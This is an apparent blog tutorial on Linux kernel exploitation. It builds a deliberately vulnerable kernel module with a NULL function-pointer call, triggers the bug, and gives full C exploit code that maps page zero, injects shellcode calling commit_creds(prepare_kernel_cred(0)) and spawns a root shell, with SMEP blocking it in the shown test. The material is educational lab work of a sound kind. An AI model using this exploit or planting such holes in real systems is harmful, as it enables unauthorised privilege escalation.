---
title: Linux Kernel - NULL Dereference Tutorial
date: 2018-02-27
update: 2018-02-27
tags:
  - Security
  - Linux-Kernel
keywords:
  - null-dereference
  - exploitation
---

Linux Kernel Exploitation Tutorial - 1

## Case

Let's get down to the point, this time, I'll give an example code which has a NULL dereference vulnerability.

Testing Environment is like below.

```c
zero@ubuntu:~$ uname -a
Linux ubuntu 4.16.0-041600rc1-generic #201802120030 SMP Mon Feb 12 00:31:33 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux
zero@ubuntu:~$ lsb_release -a
No LSB modules are available.
Distributor ID:	Ubuntu
Description:	Ubuntu Bionic Beaver (development branch)
Release:	18.04
Codename:	bionic
zero@ubuntu:~$ uname -a
Linux ubuntu 4.16.0-041600rc1-generic #201802120030 SMP Mon Feb 12 00:31:33 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux
zero@ubuntu:~$ gcc -v
...
gcc version 7.3.0 (Ubuntu 7.3.0-3ubuntu1)
```

## Code

Here's a Makefile & vulnerable code.

```c
obj-m += bug1.o

all:
	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules

clean:
	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
```


```c
#include <linux/init.h>
#include <linux/module.h> 
#include <linux/proc_fs.h>
#include <linux/kernel.h>

void (* vptr)(void);
static struct proc_dir_entry *my_proc = NULL;

static ssize_t my_write(struct file *file, const char *buf, size_t len, loff_t *data) {
    vptr();
    return len;
}

static const struct file_operations fops = {
    .owner = THIS_MODULE,
    .write = my_write
};

void __exit my_exit_module(void) {
    remove_proc_entry("bug1", NULL);
    printk("[-] bug1 module unloaded\n");
}

int __init my_init_module(void) {
    my_proc = proc_create("bug1", 0666, NULL, &fops);
    
    if(my_proc == NULL)
        return -ENOMEM;
    
    printk("[+] bug1 module loaded\n");
    return 0;    
}

module_init(my_init_module);
module_exit(my_exit_module);

MODULE_LICENSE("GPL");
MODULE_AUTHOR("zer0day");
MODULE_DESCRIPTION("null dereference test 1");
```

Clearly, we can notice that there's a NULL dereference vulnerability because of uninitialized pointer.
So, for triggering NULL dereference, we just simply call write function.

First, compile a code & add a kernel module into the kernel by following command.

```c
zero@ubuntu:~/Desktop/LK/bug1$ make all
...
zero@ubuntu:~/Desktop/LK/bug1$ sudo insmod bug1.ko
```

Then. you can see a dmesg message

```c
...
[ 8111.815103] [+] bug1 module loaded
``` 

## Bug

The kernel module is loaded, then, let's trigger the bug! 

```c
zero@ubuntu:~/Desktop/LK/bug1$ echo asdf > /proc/bug1
```

Then, you can also see a dmesg like below.

```c
[ 8123.452479] BUG: unable to handle kernel NULL pointer dereference at           (null)
[ 8123.452483] IP:           (null)
[ 8123.452484] PGD 0 P4D 0 
[ 8123.452486] Oops: 0010 [#1] SMP PTI
[ 8123.452490] Modules linked in: bug1(OE) crct10dif_pclmul crc32_pclmul ghash_clmulni_intel pcbc aesni_intel aes_x86_64 crypto_simd glue_helper cryptd vmw_balloon intel_rapl_perf snd_ens1371 snd_ac97_codec gameport ac97_bus snd_pcm snd_seq_midi snd_seq_midi_event snd_rawmidi snd_seq snd_seq_device snd_timer snd soundcore input_leds joydev serio_raw shpchp vmw_vsock_vmci_transport vsock vmw_vmci mac_hid binfmt_misc sch_fq_codel parport_pc ppdev lp parport ip_tables x_tables autofs4 hid_generic usbhid hid vmwgfx psmouse ttm drm_kms_helper syscopyarea sysfillrect mptspi sysimgblt ahci mptscsih fb_sys_fops libahci mptbase drm e1000 scsi_transport_spi i2c_piix4 pata_acpi
[ 8123.452519] CPU: 0 PID: 2630 Comm: bash Tainted: G           OE    4.16.0-041600rc1-generic #201802120030
[ 8123.452520] Hardware name: VMware, Inc. VMware Virtual Platform/440BX Desktop Reference Platform, BIOS 6.00 05/19/2017
[ 8123.452521] RIP: 0010:          (null)
[ 8123.452522] RSP: 0018:ffffb2ca82c63df0 EFLAGS: 00010286
[ 8123.452523] RAX: 0000000000000000 RBX: 0000000000000005 RCX: ffffb2ca82c63ef8
[ 8123.452524] RDX: 0000000000000005 RSI: 000055eaa6926008 RDI: ffff90717336c800
[ 8123.452525] RBP: ffffb2ca82c63e00 R08: 0000000000000000 R09: 0000000000000001
[ 8123.452525] R10: 0000000000000073 R11: 0000000000000246 R12: fffffffffffffffb
[ 8123.452526] R13: ffffb2ca82c63ef8 R14: 000055eaa6926008 R15: ffff90717336c800
[ 8123.452527] FS:  00007f225ba2db80(0000) GS:ffff907239600000(0000) knlGS:0000000000000000
[ 8123.452528] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
[ 8123.452529] CR2: 0000000000000000 CR3: 0000000094256005 CR4: 00000000003606f0
[ 8123.452550] DR0: 0000000000000000 DR1: 0000000000000000 DR2: 0000000000000000
[ 8123.452551] DR3: 0000000000000000 DR6: 00000000fffe0ff0 DR7: 0000000000000400
[ 8123.452551] Call Trace:
[ 8123.452556]  ? my_write+0x19/0x1f [bug1]
[ 8123.452630]  proc_reg_write+0x41/0x70
[ 8123.452646]  __vfs_write+0x3a/0x170
[ 8123.452651]  ? common_file_perm+0x50/0x140
[ 8123.452652]  ? apparmor_file_permission+0x1a/0x20
[ 8123.452656]  ? security_file_permission+0x41/0xc0
[ 8123.452662]  ? _cond_resched+0x19/0x40
[ 8123.452663]  vfs_write+0xb1/0x1a0
[ 8123.452665]  SyS_write+0x55/0xc0
[ 8123.452670]  do_syscall_64+0x76/0x130
[ 8123.452671]  entry_SYSCALL_64_after_hwframe+0x21/0x86
[ 8123.452673] RIP: 0033:0x7f225b115054
[ 8123.452674] RSP: 002b:00007ffcc697c628 EFLAGS: 00000246 ORIG_RAX: 0000000000000001
[ 8123.452675] RAX: ffffffffffffffda RBX: 0000000000000005 RCX: 00007f225b115054
[ 8123.452675] RDX: 0000000000000005 RSI: 000055eaa6926008 RDI: 0000000000000001
[ 8123.452676] RBP: 000055eaa6926008 R08: 000055eaa6934ca8 R09: 0000000000000004
[ 8123.452677] R10: 0000000000000073 R11: 0000000000000246 R12: 0000000000000005
[ 8123.452678] R13: 0000000000000001 R14: 00007f225b3ec720 R15: 00007f225b3e83e0
[ 8123.452679] Code:  Bad RIP value.
[ 8123.452682] RIP:           (null) RSP: ffffb2ca82c63df0
[ 8123.452683] CR2: 0000000000000000
[ 8123.452685] ---[ end trace b8845159e5bb387e ]---
```

RIP is successfully changed into NULL ptr.

## Attack

NULL dereference is triggered, then. next level is just simply inserting a payload which gains root privileges to 0x0.

But, in modern LK, default mmap min address is 65536, meaning that pre-setting min address to 0 for test.

```c
zero@ubuntu:~/Desktop/LK/bug1$ sudo sysctl -w vm.mmap_min_addr=0
vm.mmap_min_addr = 0
```

And of course, getting root privileges, we need to call **commit_creds(prepare_kernel_cred(0))**.
They can get from */proc/kallsyms*

```c
zero@ubuntu:~/Desktop/LK/bug1$ sudo cat /proc/kallsyms | grep commit_creds
ffffffffb26adf00 T commit_creds
...
zero@ubuntu:~/Desktop/LK/bug1$ sudo cat /proc/kallsyms | grep prepare_kernel_cred
ffffffffb26ae2b0 T prepare_kernel_cred
...
```

Here's a simple attack code.

```c
#define _GNU_SOURCE

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <string.h>

#include <sys/types.h>
#include <sys/mman.h>

struct cred;
struct task_struct;

typedef struct cred *(*prepare_kernel_cred_t)(struct task_struct *daemon)__attribute__((regparm(3)));
typedef int(*commit_creds_t)(struct cred *new)__attribute__((regparm(3)));

prepare_kernel_cred_t prepare_kernel_cred = (prepare_kernel_cred_t)0xffffffffb26ae2b0;
commit_creds_t commit_creds = (commit_creds_t)0xffffffffb26adf00;

void get_shell() { if (getuid() == 0) system("/bin/sh"); }
void get_root() { commit_creds(prepare_kernel_cred(0)); }

int main(int argc, char *argv[]) {
	printf("\e[36m[*] Stage 1 - Allocate 0x0\n");
	
	if (mmap((void *)0, 0x1000, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_ANON | MAP_PRIVATE | MAP_FIXED, -1, 0) == (char *)-1) {
	    perror("mmap()");
		return EXIT_FAILURE;
	}

    unsigned char shellcode[] = {
	    /* call get_root() */
	    0x48, 0xb8,
	    0x42, 0x42, 0x42, 0x42, 0x42, 0x42, 0x42, 0x42, // mov rax, &get_root()
	    0xff, 0xd0, 0x48,                               // call rax
	};
	
	void **offset = 0;
	offset = rawmemchr(shellcode, 0x42);
	(*offset) = get_root;

	memcpy((void *)0, shellcode, sizeof(shellcode));
	
	printf("\e[36m[*] Stage 2 - Trigger NULL dereference\n");
	
    int fd = open("/proc/bug1", O_WRONLY);
    write(fd, "asdf", 4); // trigger
    
    get_shell(); // get shell
}
```

compile just like this.

```c
gcc -o tri tri.c
```

compile & run this program. But it'll not work on this system right away because of SMEP :(.
you can also see like this dmesg.

```c
[13416.790759] tri[5985]: segfault at c4f943d ip 00005570bdfcd8aa sp 00007ffd0c4f9420 error 6 in tri[5570bdfcd000+1000]
[13423.943053] tri[5989]: segfault at ffffffffd5f9799d ip 00005617eefed8aa sp 00007ffed5f97980 error 7 in tri[5617eefed000+1000]
[13683.767595] tri[6041]: segfault at 904db6d ip 00005587d5bdb907 sp 00007ffe0904db50 error 6 in tri[5587d5bdb000+1000]
[14006.136039] unable to execute userspace code (SMEP?) (uid: 1000)
[14006.136042] BUG: unable to handle kernel NULL pointer dereference at           (null)
[14006.136044] IP:           (null)
...
Oops: 0011 [#2] SMP PTI
...
[14006.136122] RIP: 0010:          (null)
[14006.136123] RSP: 0018:ffffb2ca8636fdf0 EFLAGS: 00010286
[14006.136124] RAX: 0000000000000000 RBX: 0000000000000004 RCX: ffffb2ca8636fef8
[14006.136125] RDX: 0000000000000004 RSI: 000056214844eb2f RDI: ffff907236ba2a00
[14006.136126] RBP: ffffb2ca8636fe00 R08: 0000000000000001 R09: 0000000000000002
[14006.136127] R10: 0000000000000000 R11: 0000000000000246 R12: fffffffffffffffb
[14006.136128] R13: ffffb2ca8636fef8 R14: 000056214844eb2f R15: ffff907236ba2a00
[14006.136129] FS:  00007f74c141f740(0000) GS:ffff907239680000(0000) knlGS:0000000000000000
[14006.136130] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
[14006.136131] CR2: 0000000000000000 CR3: 0000000067984004 CR4: 00000000003606e0
[14006.136152] DR0: 0000000000000000 DR1: 0000000000000000 DR2: 0000000000000000
[14006.136153] DR3: 0000000000000000 DR6: 00000000fffe0ff0 DR7: 0000000000000400

```

As followed, RIP is successfully changed into NULL but, we can't execute userland code because of SMEP.
So, we need to bypass SMEP additionally :(.

* SMEP : Supervisor Mode Execution Protection (meaning userland code cannot be executed in kernelland)

But, fortunately, bypassing SMEP isn't hard as well :). Just overwriting Bit 20 of CR4 register to zero and doing other stuffs...
With above case, **CR4 value is 00000000003606e0**.

```c
>>> bin(0x3606e0)
'0b11 0110 0000 0110 1110 0000'
```

But, in this case, it's complicated to handle SMEP because there's no kernelland area to execute the code disabling SMEP before NULL dereference triggered, (meaning before userland code executed).
So, in the next post, with another case, i'll finish the payload with the bypasses.

## Epilogue

But, above cases have a lot of limitations. At first, in real world, with NULL dereference can't be triggered because of mmap min address.
Second is that we need to leak kernel base address with another vulnerability to get commit_Creds & prepare_kernel_cred and etc...
Last is considering about default kernel protections like SMEP/SMAP, etc... 

~~So, usually, if you search about LKE codes, you can easily find that their vulnerability types are UAF or sth similar.~~
~~half true, half false:)~~

**End**
